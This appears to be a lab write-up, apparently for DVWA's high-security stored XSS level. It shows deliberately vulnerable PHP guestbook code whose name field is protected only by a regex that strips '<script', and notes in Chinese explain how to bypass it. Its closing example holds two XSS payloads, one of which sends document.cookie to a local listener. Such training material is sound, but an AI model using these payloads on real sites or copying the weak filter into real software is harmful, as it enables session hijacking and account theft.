# XSS (Stored) - High

## View Source

```PHP
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

- [`preg_replace($a, $b, $c)`](https://www.php.net/manual/zh/function.preg-replace.php)
    - 將 *c* 內符合 *a* 的換成 *b*
    - [*Pattern Modifiers*](https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php)
        - `i`: 大小寫不敏感
    - `.` Match any character (except newline)
    - `*` Match 0 or more times

## Code Review

- *Name* 的欄位有 `<script` 這個順序的輸入就替換成空字串
- 一樣有前端限制長度和資料庫欄位長度限制

## Answer

- 需要在 *Name* 注入
- 如果 *Payload* 超過前端限制，用 *F12 DevTools* 修改即可

### Example

```
<img src onerror=alert(1)>
<a onclick="window.open('http://0.0.0.0:8000/?cookie=' + document.cookie)">A</a>
```